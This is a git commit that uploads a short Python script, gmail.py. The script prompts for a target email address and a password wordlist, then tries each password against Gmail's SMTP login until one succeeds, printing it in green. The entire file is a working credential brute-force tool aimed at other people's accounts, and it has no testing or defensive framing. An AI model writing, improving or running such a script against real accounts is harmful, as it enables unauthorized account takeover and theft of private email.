68ac673d66d04f94422b8b00f19ea0a39cf785a5
darkarrow428 <52023592+darkarrow428@users.noreply.github.com>
2020-04-05 13:48:33 +0530

    Add files via upload

---
+++ gmail.py
@@ -0,0 +1,22 @@
+#!/usr/bin/python 
+
+import smtplib 
+from termcolor import colored
+
+smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
+smtpserver.ehlo()
+smtpserver.starttls()
+
+user = input("[*] Enter Target Email Address:")
+passwdfile = input("[*] Enter the path to the Password file:")
+file = open(passwdfile, "r")
+
+for password in file:
+	password = password.strip('\n')
+	try:
+		smtpserver.login(user, password)
+		print(colored("[+] Password Found: %s" % password, 'green'))
+		break
+	except  smtplib.SMTPAuthenticationError:
+		print(colored("[-] Wrong Password: " + password, 'red'))
+
